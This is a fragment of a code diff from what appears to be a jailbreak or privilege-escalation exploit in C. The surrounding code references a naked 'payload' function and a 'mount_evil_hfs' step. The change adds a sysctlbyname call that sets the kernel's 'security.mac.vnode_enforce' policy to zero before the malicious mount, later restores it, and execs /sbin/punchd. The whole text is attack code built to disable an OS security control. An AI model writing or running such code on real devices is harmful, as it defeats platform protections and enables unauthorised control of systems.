@@ -210,14 +210,18 @@ __attribute__ ((naked)) void payload() {
 }
 
 int one = 1;
+int zero = 0;
 char* execve_env[]= {NULL};
 char* execve_params[]={"/sbin/punchd", NULL};
 
 int main(int argc, char* argv[]) {
+	// make sure this is disabled
+    sysctlbyname("security.mac.vnode_enforce", NULL, 0, &zero, sizeof(one));
+
 	prepare_vndevice();
 	mount_evil_hfs();
 
-	//restore vnode_enforce and run launchd
+	// restore vnode_enforce and run launchd
     sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one));   
 	execve(execve_params[0], execve_params, execve_env);
 }
